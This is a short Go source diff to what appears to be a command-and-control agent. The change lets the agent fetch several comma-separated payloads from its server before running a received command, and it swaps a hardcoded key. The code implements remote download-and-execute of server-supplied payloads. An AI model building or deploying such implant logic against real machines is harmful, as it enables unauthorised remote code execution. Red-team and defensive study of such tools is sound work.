@@ -10,6 +10,7 @@ import (
 	"reflect"
 	"runtime"
 	"strconv"
+	"strings"
 	"time"
 
 	"./api"
@@ -30,7 +31,12 @@ func askForInstructions(profile map[string]interface{}) {
 			cmd := cmds.Index(i).Elem().String()
 			fmt.Println("[*] Running instruction")
 			command := util.Unpack([]byte(cmd))
-			api.Drop(profile["server"].(string), command["payload"].(string))
+			payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
+			for _, payload := range payloads {
+				if len(payload) > 0 {
+					api.Drop(profile["server"].(string), payload)
+				}
+			}
 			api.Execute(profile, command)
 		}
 	} else {
@@ -69,4 +75,4 @@ func main() {
 	}
 }
 
-var key = "QJR3LS1PWJDYG3N5DRWIZXX37HXGL0"
+var key = "1R6F6A5Y0B0CUG2KVFW0IQWX4NGJFI"
